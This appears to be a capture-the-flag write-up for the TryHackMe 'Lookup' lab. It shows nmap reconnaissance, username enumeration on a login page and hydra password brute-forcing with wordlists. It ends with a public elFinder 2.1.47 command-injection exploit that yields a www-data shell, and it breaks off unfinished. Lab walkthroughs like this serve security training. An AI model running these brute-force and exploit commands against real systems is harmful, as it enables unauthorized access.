📚 [TryHackMe Lookup](https://tryhackme.com/room/lookup)


## recon

[nmap scan (zznmap)](https://github.com/TurboLabIt/cybersec/blob/main/notes/nmap.md)

````shell
$ zznmap 10.66.130.136 

Discovered open port 22/tcp
Discovered open port 80/tcp

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ba:d6:31:a4:86:28:48:27:1c:d9:06:6e:3e:4a:31:e1 (RSA)
|   256 5a:ef:c2:3d:48:b7:30:fe:0b:d7:e5:57:f2:91:a6:d5 (ECDSA)
|_  256 c3:5b:17:3c:ed:bf:2f:60:70:9b:7b:83:7a:40:c0:68 (ED25519)

80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://lookup.thm
|_http-server-header: Apache/2.4.41 (Ubuntu)
````

- **22**: OpenSSH 8.2p1
- **80**:  Apache httpd 2.4.41


## webapp recon

````shell
$ sudo nano /etc/hosts

10.66.130.136 lookup.thm
````

[lookup.thm](http://lookup.thm)


````shell
$ curl -i http://lookup.thm
HTTP/1.1 200 OK

<form action="login.php" method="post">
  <h2>Login</h2>
  <div class="input-group">
    <label for="username">Username</label>
    <input type="text" id="username" name="username" required>
  </div>
  <div class="input-group">
    <label for="password">Password</label>
    <input type="password" id="password" name="password" required>
  </div>
  <button type="submit">Login</button>
</form>
````

🗡️ The application reveals if the username exists or not.

 With the username "pippo", we get:

> Wrong username or password. Please try again.

 With the username "admin", we get:

> Wrong password. Please try again.

Attack with [notes/hydra-login-http.md](https://github.com/TurboLabIt/cybersec/blob/main/notes/notes/hydra-login-http.md):

````
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  lookup.thm http-post-form \
  "/login.php:username=^USER^&password=^PASS^:F=Wrong password" \
  -t 64
````

Every try returns "Wrong password". But, when trying `password123`, it returns "Wrong username or password". So:

- `admin` exists
- `password123` is a valid password
- they are not the correct pair

Let's try to use this password with other usernames:

````shell
$ sudo apt update && sudo apt install seclists -y
$ hydra -L /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \
  -p 'password123' \
  lookup.thm http-post-form \
  "/login.php:username=^USER^&password=^PASS^:F=Wrong username or password" \
  -t 64
  
[80][http-post-form] host: lookup.thm   login: jose   password: password123
````

Credentials found! `jose` / `password123`.

We get a redirect to `http://files.lookup.thm`.


````shell
$ sudo nano /etc/hosts

10.66.130.136 lookup.thm files.lookup.thm
````

Here we get a web file manager. There are multiple files with some random-looking words.

Some relevant file may be:

- thislogin.txt: `jose : password123` (our current credentials)
- credentials.txt: `think : nopassword`
- root.txt: `symmetrical volumetrically`

The webapp is elFinder v2.1.47, protocol version: 2.1047, jQuery/jQuery UI: 3.3.1/1.12.1

It's vulnerable: https://pentest-tools.com/vulnerabilities-exploits/elfinder-2147-command-injection_27343

Exploit: https://www.exploit-db.com/exploits/46481

It needs an image and a target:

````
$ curl -o SecSignal.jpg https://upload.wikimedia.org/wikipedia/commons/b/b2/JPEG_compression_Example.jpg
$ python2 elfinder-exploit.py http://files.lookup.thm/elFinder/                                         
[*] Uploading the malicious image...
[*] Running the payload...
[+] Pwned! :)
[+] Getting the shell...

$ whoami
www-data
````

... to be continued ...
